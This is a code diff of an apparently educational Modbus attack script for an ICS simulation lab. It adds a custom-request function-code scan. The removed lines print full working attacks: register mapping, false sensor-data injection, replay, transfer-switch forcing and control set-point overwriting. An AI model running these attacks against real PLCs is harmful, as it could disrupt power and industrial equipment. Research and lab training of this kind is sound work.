@@ -11,29 +11,38 @@ import numpy as np
 from time import sleep
 from threading import Thread
 from pymodbus.client import ModbusTcpClient, ModbusSerialClient
-#from pyModbusTCP.client import ModbusClient
-#from scipy.stats import norm
+from pymodbus.pdu import ModbusRequest
 
 # constants
 LOGO = r"""
-  ___                _      ___     _    _   ___ _           _      _   _             ___     _                  _  _   _           _       
- / __|_ __  __ _ _ _| |_   / __|_ _(_)__| | / __(_)_ __ _  _| |__ _| |_(_)___ _ _    / __|  _| |__  ___ _ _ ___ /_\| |_| |_ __ _ __| |__ ___
- \__ \ '  \/ _` | '_|  _| | (_ | '_| / _` | \__ \ | '  \ || | / _` |  _| / _ \ ' \  | (_| || | '_ \/ -_) '_|___/ _ \  _|  _/ _` / _| / /(_-<
- |___/_|_|_\__,_|_|  \__|  \___|_| |_\__,_| |___/_|_|_|_\_,_|_\__,_|\__|_\___/_||_|  \___\_, |_.__/\___|_|    /_/ \_\__|\__\__,_\__|_\_\/__/
-                                                                                         |__/                                                  
+  ___ ___ ___     ___ _       _         _       ___     _                 _  _   _           _       
+ |_ _/ __/ __|___/ __(_)_ __ | |   __ _| |__   / __|  _| |__  ___ _ _    /_\| |_| |_ __ _ __| |__ ___
+  | | (__\__ \___\__ \ | '  \| |__/ _` | '_ \ | (_| || | '_ \/ -_) '_|  / _ \  _|  _/ _` / _| / /(_-<
+ |___\___|___/   |___/_|_|_|_|____\__,_|_.__/  \___\_, |_.__/\___|_|   /_/ \_\__|\__\__,_\__|_\_\/__/
+                                                   |__/                                                                                             
 """
 
-# globals
-stop_looping = False
+class CustomModbusRequest(ModbusRequest):
+    def __init__(self, fc, custom_data=b'', **kwargs):
+        ModbusRequest.__init__(self, **kwargs)
+        self.custom_data = custom_data
+        self.function_code = fc
 
-# helper function to wait for 30 seconds
-def _check_for_enter():
-    global stop_looping
-    sleep(30)
-    stop_looping = True
+    def encode(self):
+        return self.custom_data
+    
+    def decode(self, data):
+        self.custom_data = data
+
+def create_custom_request(fc):
+    class DynamicRequest(CustomModbusRequest):
+        pass
+    DynamicRequest.function_code = fc
+    return DynamicRequest
+
 
 # Function: address_scan
-# Purpose: Performs an address scan on the ICS simulation network 192.168.0.0/24. The
+# Purpose: Performs an address scan on the given network in CIDR format. The
 #   scan identifies hosts running with port 502 open, as this port is used for Modbus
 #   TCP communication.
 def address_scan(ip_CIDR):
@@ -76,10 +85,12 @@ def function_code_scan(ip_addresses):
 
     print("### FUNCTION CODE SCAN ###")
 
+    # scan ips (Modbus TCP)
+    # TODO: find a way to make a custom modbus packet in pymodbus
     for ip in ip_addresses:
-        print(f"===== Performing a function code scan on {ip} =====")
+        print(f"===== Performing a function code scan IP {ip} =====")
         print()
-        client = ModbusClient(host=ip, port=502)
+        client = ModbusTcpClient(host=ip, port=502)
     
         for fc_set in allFc:
             if 1 in fc_set:
@@ -91,15 +102,17 @@ def function_code_scan(ip_addresses):
 
             for fc in fc_set:
                 # send custom pdu request
-                fc_bytes = fc.to_bytes(1, 'big')
-                pdu = fc_bytes + b'\x00\x00\x00\x00'
-                response = client.custom_request(pdu)
+                CustomFunctionCode = create_custom_request(fc)
+                request = CustomFunctionCode(custom_data=b'\x00\x00\x00\x00')
+                response = client.execute(request=request)
+
+                print(response)
 
                 # check if exception occurred
                 if response == None:
                     # check if an illegal function error occurred (means the modbus client doesn't accept the fc)
-                    if client.last_except != 1:
-                        print(f"Acception function code {fc} (with non-illegal exception code: {client.last_except})")
+                    #if client.last_except != 1:
+                    print(f"Acception function code {fc}")
                 else:
                     print(f"Accepted function code {fc}")
         print()
@@ -138,220 +151,6 @@ def device_identification_attack(ip_addresses):
         print()
         client.close()
     print("### DEVICE IDENTIFICATION ATTACK FINISH ###")
-
-# Function: naive_sensor_read
-# Purpose: Scans over all registers and coils and attempts for find changing values,
-#   which can potentially expose used addresses.
-def naive_sensor_read(ip_addresses):
-    print("### NAIVE SENSOR READ ###")
-
-    for ip in ip_addresses:
-        print(f"===== Performing naive sensor read on {ip} =====")
-        print("Scanning for all registers (coils/di/ir/hr) for 15 seconds")
-        print("Attempting to find sensor values")
-        print("-------------------------------")
-
-        client = ModbusClient(host=ip, port=502)
-
-        prev_coil = client.read_coils(0, 2000)
-        prev_di = client.read_discrete_inputs(0, 2000)
-        prev_ir = client.read_input_registers(0, 125)
-        prev_hr = client.read_holding_registers(0, 125)
-
-        coil_found = []
-        di_found = []
-        ir_found = []
-        hr_found = []
-
-        for _ in range(15):
-            sleep(1)
-            coil = client.read_coils(0, 2000)
-            di = client.read_discrete_inputs(0, 2000)
-            ir = client.read_input_registers(0, 125)
-            hr = client.read_holding_registers(0, 125)
-
-            # compare previous response to current response
-            for i in range(len(prev_coil)):
-                if coil[i] != prev_coil[i] or coil[i] != 0:
-                    if i not in coil_found:
-                        print(f"Changing coil found at location {i} (likely a sensor/actuator value)")
-                    coil_found.append(i)
-            prev_coil = coil
-            for i in range(len(prev_di)):
-                if di[i] != prev_di[i] or di[i] != 0:
-                    if i not in di_found:
-                        print(f"Changing discrete input found at location {i} (likely a sensor/actuator value)")
-                    di_found.append(i)
-            prev_di = di
-            for i in range(len(prev_ir)):
-                if ir[i] != prev_ir[i] or ir[i] != 0:
-                    if i not in ir_found:
-                        print(f"Changing holding register found at location {i} (likely a sensor/actuator value)")
-                    ir_found.append(i)
-            prev_coil = coil
-            for i in range(len(prev_hr)):
-                if hr[i] != prev_hr[i] or hr[i] != 0:
-                    if i not in hr_found:
-                        print(f"Changing holding register found at location {i} (likely a sensor/actuator value)")
-                    hr_found.append(i)
-        print("-------------------------------")
-        client.close()
-    print("### NAIVE SENSOR READ FINISH ###")
-
-# Function: sporadic_sensor_measurement_injection
-# Purpose: Writes completely random values to coil/holding registers. 
-def sporadic_sensor_measurement_injection(ip_addresses):
-    print("### SPORADIC SENSOR MEASUREMENT INJECTION ###")
-    
-    for ip in ip_addresses:
-        print(f"Injecting random data for 10 seconds into {ip}")
-        print("Affecting found addresses: coil 10, holding register 20, 21")
-
-        client = ModbusClient(host=ip, port=502)
-
-        # affect coils
-        for _ in range(300):
-            sleep(0.05)
-            coil_value = random.choice([True, False])
-            client.write_single_coil(10, coil_value)
-
-        # affect holding registers
-        for _ in range(300):
-            sleep(0.05)
-            hr_value = random.randint(0, 65535)
-            client.write_single_register(20, hr_value)
-            client.write_single_register(21, hr_value)
-        
-        client.close()
-    print("### SPORADIC SENSOR MEASUREMENT INJECTION FINSIH ###")
-
-# Function: calculated_sensor_measure_injection
-# Purpose: Writes calculated values to make it seem like a solar panel is working. Uses
-#   a normal distribution model to simulate a running solar panel.
-def calculated_sensor_measure_injection(ip_addresses):
-    print("### CALCULATED SENSOR MEASUREMENT INJECTION ###")
-
-    for ip in ip_addresses:
-        print(f"Overwriting holding register address 20 for {ip}")
-        print("Injecting data to make it appear as if high amounts of solar power is being generated")
-        print("Note: this attack should be executed at \"morning\" time for the simulation")
-
-        client = ModbusClient(host=ip, port=502)
-
-        # create a set of calculated values to inject
-        # Note: power_const of 15 generates high amount of power for a typical 2W rated solar panel
-        power_const = 15
-        efficency = 0.7
-
-        # Generate 48 time intervals over 24 hours (every 30 minutes)
-        x = np.linspace(0, 24, 48)
-
-        # Generate a normal distribution representing solar generation in milliWatts (provide estimated constants)
-        calculated_vals = norm.pdf(x, 12, 2)*power_const*efficency*1000
-        calculated_vals = calculated_vals.astype(int)
-
-        # inject calculated values
-        for i in calculated_vals:
-            for _ in range(5):
-                client.write_single_register(20, i)
-                sleep(0.2)
-        client.close()
-    print("### CALCULATED SENSOR MEASUREMENT INJECTION FINISHED ###")
-
-# Function: replayed_measurement_injection
-# Purpose: Captures data and replays the data. Press enter to stop capturing data
-#   and to start replaying it
-def replayed_measurement_injection(ip_addresses):
-    global stop_looping
-    print("### REPLAYED MEASUREMENT INJECTION ###")
-
-    for ip in ip_addresses:
-        captured_vals = []
-
-        print(f"Capturing data from {ip} for ")
-        print("Press enter to stop capturing data")
-        client = ModbusClient(host=ip, port=502)
-
-        stop_looping = False
-        th_stopper = Thread(target=_check_for_enter)
-        th_stopper.start()
-
-        while not stop_looping:
-            val = client.read_holding_registers(20)[0]
-            captured_vals.append(val)
-            print(f"Captured value: {val}")
-            sleep(1)
-        
-        print(captured_vals)
-        print("Replaying captured data")
-        for i in captured_vals:
-            client.write_single_register(20, i)
-            print(f"Injected value: {i}")
-            sleep(1)
-        client.close()
-    print("### REPLAYED MEASUREMENT INJECTION FINISH ###")
-
-# Function: altered_actuator_state
-# Purpose: Changes the state of the transfer switch actuator
-def altered_actuator_state(ip_addresses, state=None):
-    print("### ALTERED ACTUATOR STATE ###")
-
-    for ip in ip_addresses:
-        client = ModbusClient(host=ip, port=502)
-
-        while True:
-            print(f"Changing the state of the transfer switch for PLC {ip}")
-            if state is not None:
-                ts_state = state
-            else:
-                try:
-                    ts_state = int(input("Change the transfer switch to (1) mains power or (2) solar power?"))
-                except:
-                    ts_state = 0
-
-            if ts_state == 1:
-                print("Setting transfer switch to mains power")
-                client.write_single_coil(10, 0)
-            elif ts_state == 2:
-                print("Setting transfer switch to solar power")
-                client.write_single_coil(10, 1)
-            
-            if state is None:
-                cont = input("Change transfer switch state again? (y/n)")
-                if cont != "y":
-                    break
-            else:
-                break
-
-        client.close()
-    print("### ALTERED ACTUATOR STATE FINISH ###")
-
-# Function: alter_control_set_points
-# Purpose: Changes control points of the simulation. Specifically alters
-#   the transfer switch switching threshold
-def altered_control_set_points(ip_addresses, threshold=None):
-    print("### ALTERED CONTROL SET POINTS ###")
-    
-    for ip in ip_addresses:
-        # get new value to change to
-        print(f"Changing transfer switch threshold value (holding register 21) for {ip}")
-        new_val = 0
-
-        if threshold is not None:
-            new_val = threshold % 65535
-        else:
-            try:
-                new_val = int(input("Enter interger number to change value to (1-65535):"))
-            except ValueError:
-                pass
-            new_val = new_val % 65535
-
-        # change threshold value
-        client = ModbusClient(host=ip, port=502)
-        client.write_single_register(21, new_val)
-        client.close()
-
-    print("### ALTERED CONTROL SET POINTS FINSIH")
 
 # Function: force_listen_mode
 # Purpose: Sends function code 0x08 with sub-function code 0x0004
